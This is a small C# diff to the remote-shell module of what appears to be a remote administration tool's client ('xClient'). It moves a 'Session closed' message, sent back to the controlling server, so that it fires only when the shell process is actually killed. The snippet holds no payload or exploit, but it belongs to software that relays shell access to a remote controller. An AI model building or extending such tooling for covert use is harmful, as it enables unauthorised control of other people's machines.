@@ -76,11 +76,13 @@ namespace xClient.Core.RemoteShell
             try
             {
                 if (!_prc.HasExited)
+                {
                     _prc.Kill();
+                    new Packets.ClientPackets.ShellCommandResponse(">> Session closed" + Environment.NewLine).Execute(Program.ConnectClient);
+                }
             }
             catch
             { }
-            new Packets.ClientPackets.ShellCommandResponse(">> Session closed" + Environment.NewLine).Execute(Program.ConnectClient);
         }
 
         public void CloseSession()
@@ -89,11 +91,13 @@ namespace xClient.Core.RemoteShell
             try
             {
                 if (!_prc.HasExited)
+                {
                     _prc.Kill();
+                    new Packets.ClientPackets.ShellCommandResponse(">> Session closed" + Environment.NewLine).Execute(Program.ConnectClient);
+                }
             }
             catch
             { }
-            new Packets.ClientPackets.ShellCommandResponse(">> Session closed" + Environment.NewLine).Execute(Program.ConnectClient);
         }
     }
 }
